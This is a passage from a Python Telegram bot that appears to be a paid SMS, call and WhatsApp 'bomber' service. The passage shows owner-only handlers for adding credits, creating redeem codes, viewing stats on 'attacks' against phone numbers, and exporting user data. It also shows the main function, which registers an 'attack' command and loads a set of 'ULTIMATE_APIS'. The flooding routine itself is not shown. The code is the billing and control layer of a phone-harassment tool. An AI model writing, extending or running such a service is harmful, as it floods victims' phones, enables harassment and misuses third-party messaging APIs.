            f"✅ *Credits Added*\n\n"
            f"👤 User ID: `{user_id}`\n"
            f"💰 Amount: +{amount}\n"
            f"💰 New Balance: {new_balance}",
            parse_mode='Markdown'
        )
    except ValueError:
        await update.message.reply_text("❌ Invalid user_id or amount!")

async def admin_create_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Create a redeem code"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You're not the owner!")
        return
    
    if len(context.args) < 1:
        await update.message.reply_text(
            "🎫 *Create Redeem Code*\n\n"
            "Usage: `/createcode [credits]`\n"
            "Example: `/createcode 100`\n\n"
            "📊 Creates a code with specified credits",
            parse_mode='Markdown'
        )
        return
    
    try:
        credits = int(context.args[0])
        if credits < 1:
            await update.message.reply_text("❌ Credits must be greater than 0!")
            return
        
        if credits > 10000:
            await update.message.reply_text("❌ Maximum 10000 credits per code!")
            return
        
        # Generate code
        code = create_redeem_code(credits, OWNER_ID)
        
        await update.message.reply_text(
            f"✅ *Redeem Code Created!*\n\n"
            f"🎫 Code: `{code}`\n"
            f"💰 Credits: {credits}\n"
            f"📅 Expires: 30 days\n\n"
            f"Share this code with users to redeem!",
            parse_mode='Markdown'
        )
    except ValueError:
        await update.message.reply_text("❌ Invalid amount!")

async def admin_list_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all redeem codes"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You're not the owner!")
        return
    
    codes = get_all_redeem_codes()
    
    if not codes:
        await update.message.reply_text("No redeem codes found!")
        return
    
    code_list = "📋 *Redeem Codes*\n\n"
    active = 0
    used = 0
    expired = 0
    
    for code in codes[:20]:
        status_emoji = "✅" if code[4] == "active" else "❌" if code[4] == "used" else "⚠️"
        code_list += f"{status_emoji} `{code[1]}` - {code[2]} credits - {code[4]}\n"
        
        if code[4] == "active":
            active += 1
        elif code[4] == "used":
            used += 1
        else:
            expired += 1
    
    if len(codes) > 20:
        code_list += f"\n... and {len(codes) - 20} more codes"
    
    code_list += f"\n\n📊 *Summary:*\n"
    code_list += f"• Active: {active}\n"
    code_list += f"• Used: {used}\n"
    code_list += f"• Expired: {expired}\n"
    code_list += f"• Total: {len(codes)}"
    
    await update.message.reply_text(code_list, parse_mode='Markdown')

async def admin_stats_full(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You're not the owner!")
        return
    
    users = get_all_users()
    total_users = len(users)
    
    total_credits = sum(user[1] for user in users if user[1])
    total_attacks = sum(user[2] for user in users if user[2])
    total_sms = sum(user[3] for user in users if user[3])
    total_calls = sum(user[4] for user in users if user[4])
    total_whatsapp = sum(user[5] for user in users if user[5]) if len(users[0]) > 5 else 0
    
    # Get redeem code stats
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute("SELECT COUNT(*), SUM(credits) FROM redeem_codes WHERE status = 'active'")
    active_codes, active_credits = c.fetchone()
    active_codes = active_codes or 0
    active_credits = active_credits or 0
    
    c.execute("SELECT COUNT(*), SUM(credits) FROM redeem_codes WHERE status = 'used'")
    used_codes, used_credits = c.fetchone()
    used_codes = used_codes or 0
    used_credits = used_credits or 0
    
    c.execute("SELECT phone, attack_count, created_at FROM attacks ORDER BY created_at DESC LIMIT 5")
    recent_attacks = c.fetchall()
    conn.close()
    
    recent = "🔄 *Recent Attacks:*\n"
    for attack in recent_attacks:
        recent += f"• {attack[0]} - {attack[1]} attacks ({attack[2]})\n"
    
    await update.message.reply_text(
        f"👑 *Full Admin Stats*\n\n"
        f"👥 Total Users: {total_users}\n"
        f"💰 Total Credits: {total_credits}\n"
        f"📱 Total Attacks: {total_attacks}\n"
        f"💬 SMS Sent: {total_sms}\n"
        f"📞 Calls Sent: {total_calls}\n"
        f"📱 WhatsApp Sent: {total_whatsapp}\n\n"
        f"🎫 *Redeem Codes:*\n"
        f"• Active: {active_codes} ({active_credits} credits)\n"
        f"• Used: {used_codes} ({used_credits} credits)\n\n"
        f"{recent}",
        parse_mode='Markdown'
    )

async def admin_export(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You're not the owner!")
        return
    
    users = get_all_users()
    
    data = "User ID,Username,First Name,Last Name,Credits,Total Attacks,SMS Sent,Calls Sent,WhatsApp Sent,Created At\n"
    for user in users:
        data += f"{user[0]},{user[8] or 'N/A'},{user[9] or 'N/A'},{user[10] or 'N/A'},{user[1]},{user[2]},{user[3]},{user[4]},{user[5]},{user[12]}\n"
    
    # Also export redeem codes
    data += "\n\nREDEEM CODES\n"
    data += "Code,Credits,Created By,Status,Used By,Created At\n"
    codes = get_all_redeem_codes()
    for code in codes:
        data += f"{code[1]},{code[2]},{code[3]},{code[4]},{code[5] or 'N/A'},{code[6]}\n"
    
    with open('export_data.csv', 'w') as f:
        f.write(data)
    
    await update.message.reply_document(
        document=open('export_data.csv', 'rb'),
        filename=f'export_{datetime.now().strftime("%Y%m%d_%H%M")}.csv',
        caption=f"📊 Full Data Export\n\n👥 Users: {len(users)}\n🎫 Codes: {len(codes)}"
    )
    
    os.remove('export_data.csv')

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "admin_create_redeem":
        await query.edit_message_text(
            f"🎫 *Create Redeem Code*\n\n"
            f"Use: `/createcode [credits]`\n\n"
            f"Example: `/createcode 100`\n\n"
            f"📊 Creates a code for 100 credits",
            parse_mode='Markdown'
        )
    
    elif query.data == "admin_list_redeem":
        await admin_list_redeem(update, context)
    
    else:
        # Handle existing handlers
        if query.data == "buy_credits":
            await query.edit_message_text(
                f"💰 *Buy Credits*\n\nContact @Luafucker",
                parse_mode='Markdown'
            )
        elif query.data == "admin_users":
            await admin_users(update, context)
        elif query.data == "admin_broadcast":
            await query.edit_message_text(
                f"📢 *Broadcast*\n\nUse: `/broadcast [message]`",
                parse_mode='Markdown'
            )
        elif query.data == "admin_add_credits":
            await query.edit_message_text(
                f"💰 *Add Credits*\n\nUse: `/addcredits [user_id] [amount]`",
                parse_mode='Markdown'
            )
        elif query.data == "admin_stats":
            await admin_stats_full(update, context)
        elif query.data == "admin_export":
            await admin_export(update, context)

def main():
    try:
        application = ApplicationBuilder().token(BOT_TOKEN).build()
        
        # User commands
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("attack", attack))
        application.add_handler(CommandHandler("redeem", redeem))
        application.add_handler(CommandHandler("balance", balance))
        application.add_handler(CommandHandler("credits", balance))
        application.add_handler(CommandHandler("stats", stats))
        application.add_handler(CommandHandler("refer", refer))
        application.add_handler(CommandHandler("referrals", referrals))
        application.add_handler(CommandHandler("status", status_command))
        application.add_handler(CommandHandler("buy", buy_credits))
        application.add_handler(CommandHandler("help", help_command))
        
        # Admin commands
        application.add_handler(CommandHandler("admin", admin_panel))
        application.add_handler(CommandHandler("users", admin_users))
        application.add_handler(CommandHandler("broadcast", admin_broadcast))
        application.add_handler(CommandHandler("addcredits", admin_add_credits))
        application.add_handler(CommandHandler("createcode", admin_create_redeem))
        application.add_handler(CommandHandler("listcodes", admin_list_redeem))
        application.add_handler(CommandHandler("adminstats", admin_stats_full))
        application.add_handler(CommandHandler("export", admin_export))
        
        application.add_handler(CallbackQueryHandler(button_handler))
        
        print("🤖 Bot started successfully!")
        print(f"⚡ APIs loaded: {len(ULTIMATE_APIS)}")
        print("📱 Database initialized")
        print(f"👑 Owner ID: {OWNER_ID}")
        print("🎫 Redeem Code System Active")
        
        application.run_polling(allowed_updates=Update.ALL_TYPES)
        
    except Exception as e:
        print(f"❌ Error: {str(e)}")
        sys.exit(1)

if __name__ == '__main__':
    main()